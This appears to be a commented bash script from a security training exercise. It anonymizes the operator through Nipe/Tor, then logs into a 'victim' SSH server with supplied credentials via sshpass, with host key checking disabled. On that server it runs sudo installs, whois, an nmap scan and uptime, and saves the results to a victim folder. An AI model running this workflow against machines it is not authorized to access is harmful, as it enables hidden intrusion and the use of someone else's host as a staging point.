#!/bin/bash

ROOT_CHECK() #In order to execute the rest of the program, we must require Root permissions. This Function will check that we execute the SH file with Root permissions. If we didn't execute the SH file with Root permissions it will ask us for password and give us Root privileges.

{
    if [ "$(whoami)" != "root" ]; # Will use the whoami to check if the user executing the SH file does not have root privileges
		then
        echo -e "\e[31mYou are not Root. Attempting to give Root privileges...\e[0m" #The colored text will light up to the user more
        sleep 3
        
        # Ask for sudo access
        sudo -v # -v flag for sudo is the command for requesting the root password in order to give root privileges
        if [ $? -ne 0 ]; then # ? is the state of the output either 0 if successful other another number if it fails. -ne 0 is stating the output was not equal to 0 and thus a failure.
            echo "Failed to obtain Root privileges. Exiting."
            sleep 3
            exit # exits the function due to failure to get the password correct
        fi

		echo -e "\e[34mRoot access granted!\e[0m"
        sleep 3
    else
        echo -e "\e[34mYou have Root permissions.\e[0m"
        sleep 3
    fi
}
	

#This will check if we have all the tools installed
function APP_CHECK()
{
for TOOL in sshpass geoiplookup whois nmap #Tool variable will contain the value of all the tools we need
do
CHECK=$(which $TOOL) #For locating each tool, checking if these exist in the host machine
if [ "$CHECK" == "" ] # "" tells us if the tool exists within the host machine
then
echo -e "\e[31mThe tool $TOOL dpes not exist..\e[32m starting download\e[0m" 
sleep 3
sudo apt-get install-y $TOOL &>/dev/null #Silently installs tools we will need
else
echo -e "\e[32mThe tool $TOOL has already been installed\e[0m"
sleep 3
fi
done

}



	
function NIPE_CHECK()
{
	TRACK=$(locate nipe.pl)
	if [ -z "$TRACK" ] 
	then
	echo -e "\e[31mNipe is not exist, \e[32mstarting installation\e[0m"
	sleep 3
	
	git clone https://github.com/htrgouvea/nipe && cd nipe 
	sudo apt-get install cpanminus -y
	sudo perl nipe.pl install
	echo -e "\e[32mInstallation completed\e[0m"
	sleep 3
	else
	echo -e "\e[32mNipe is installed\e[0m"
	sleep 3
	fi
}
#We need to check that the user's nipe is working and is spoofing a different country
function ANON_CHECK() 
{
    EX_IP=$(curl -s ident.me) #EX_IP variable is for checking the current IP address
    COUNTRY=$(geoiplookup $EX_IP | awk '{print $5}')  #COUNTRY variable for checking what country does EX_IP belongs to

    if [ "$COUNTRY" == "Israel" ] #For making sure the IP address isn't in Israel and therfore checking the NIPE is working
		then
        echo -e "\e[34mYour country is \e[31m$COUNTRY \e[0m" 
        sleep 2
        echo -e "\e[31mYou are not anonymous,\e[32m activating Nipe... \e[0m"
        sleep 2
        
        NIPE_DIR="/home/kali/Desktop/bash_folders/nipe" #Set the correct Nipe directory

        if [ ! -d "$NIPE_DIR" ] #Ensure Nipe directory exists
			then
            echo -e "\e[31m Error: Nipe directory not found at $NIPE_DIR \e[0m"
            exit 1
        fi

        cd "$NIPE_DIR" || exit #Navigate to the Nipe directory and execute NIPE, it will exit if it fails
        
        sudo perl nipe.pl start
        sudo perl nipe.pl restart
        
	NEW_IP=$(curl -s ident.me) #Checking the IP address
	NEW_Country=$(geoiplookup $NEW_IP |awk '{print $5,$6,$7}') #Checking what country does the NEW_IP belong to
	echo -e "\e[32m$NEW_Country \e[34mis the country you are spoofing. Now you are anonymous.\e[0m"
        sleep 2
        echo -e "\e[34mYour new IP address is:\e[32m"
        sleep 2
        sudo perl nipe.pl status #Display the new IP
    else
        echo -e "\e[32m$COUNTRY \e[34mis the country you are spoofing. You are anonymous\e[0m"
        sleep 3
    fi
}

#Now to actually access the victim machine through their ssh service, enter the information we know about the victim to access their device and then document additional information about the victim.
function CONTROL_VICTIM()
{
	echo -e "\e[33mInput the IP address of the SSH victim server\e[0m"
	read IP_V
	echo -e "\e[33mInput the Username of the SSH victim server\e[0m"
	read USER_V
	echo -e "\e[33mInput the PASSWORD of the SSH victim server\e[0m"
	read PASS_V
	
	mkdir -p victimfolder #This command checks if victimfolder exist. To send the victim's information in it. If not the -p it will create it.
	
#Logging the information of the victim in victim_data. 
	echo "Data of the Victim:" > victimfolder/victim_data.txt #The single > will override any previous information
	
#Writing the external IP address of the victim's machine:
	echo "The external IP address of the victim server: " >> victimfolder/victim_data.txt   
#sshpass will enter the password from $PASS_V, ssh is used to start a SSH session, -o StrictHostKeyChecking=no disables the host key verification prompt, $USER_V@$IP_V for entering the user name and IP address       
	sshpass -p $PASS_V ssh -o StrictHostKeyChecking=no $USER_V@$IP_V "curl -s ident.me" >> victimfolder/victim_data.txt #In order to document the IP address of the victim
	
	echo " " >> victimfolder/victim_data.txt #seperator in the victim_data txt
	
#Documenting the Country's ip of the victim
	echo "The country of the victim: " >> victimfolder/victim_data.txt 
	sshpass -p "$PASS_V" ssh -o StrictHostKeyChecking=no "$USER_V@$IP_V" \ "echo '$PASS_V' | sudo -S apt update && sudo -S apt install geoip-bin -y"  #in case geoiplookup is not installed, we will install it
	sshpass -p "$PASS_V" ssh -o StrictHostKeyChecking=no "$USER_V@$IP_V" \ "echo '$PASS_V' | sudo -S geoiplookup \$(curl -s ident.me)" >> victimfolder/victim_data.txt #Use geoiplookup to get the country of the external IP address
	
	
	echo " " >> victimfolder/victim_data.txt
	
	
	echo "Executing the command 'whois espn.com' to get information using whois" #Executing the 'whois' command on espn.com to retrieve domain registration details
	sshpass -p $PASS_V ssh -o StrictHostKeyChecking=no $USER_V@$IP_V "whois espn.com" > victimfolder/whois.txt  #Using SSH to connect to a remote machine and run: "whois espn.com"
	echo "$(date) whois executed on espn.com" > victimfolder/log.txt #Log the execution of the 'whois' command with a timestamp in log.txt
	echo "Executing nmap on domain scanme.nmap.com"
	sleep 2
	sshpass -p $PASS_V ssh -o StrictHostKeyChecking=no $USER_V@$IP_V "nmap scanme.nmap.com -p 80" > victimfolder/nmap.txt
	echo "$(date) nmap scan finished on scanme.nmap.com" >> victimfolder/log.txt
	

	
#Writing down the time elasped of the connection to the ssh server of the victim
	echo " The time accessed to the victim: " >> victimfolder/victim_data.txt
	sshpass -p $PASS_V ssh -o StrictHostKeyChecking=no $USER_V@$IP_V "uptime" >> victimfolder/victim_data.txt
	

	echo -e "\e[32m3 new files created: whois.txt victim_data.txt nmap.txt\e[0m" 
}
 
#Check to reduce the speed of the commands
figlet "ROOT CHECK" 
sleep 2
ROOT_CHECK
echo "-----------------"
figlet "APP CHECK"
sleep 2
APP_CHECK
echo "-----------------"
figlet "NIPE CHECK"
sleep 2
NIPE_CHECK
echo "-----------------"
figlet "ANON CHECK"
sleep 2
ANON_CHECK
echo -e "\e[0m-----------------"
figlet "CONTROL VICTIM" 
sleep 2
CONTROL_VICTIM
/usr/games/cowsay  "Thank You for reviewing! (I am also pretty sure I am a horse)" 
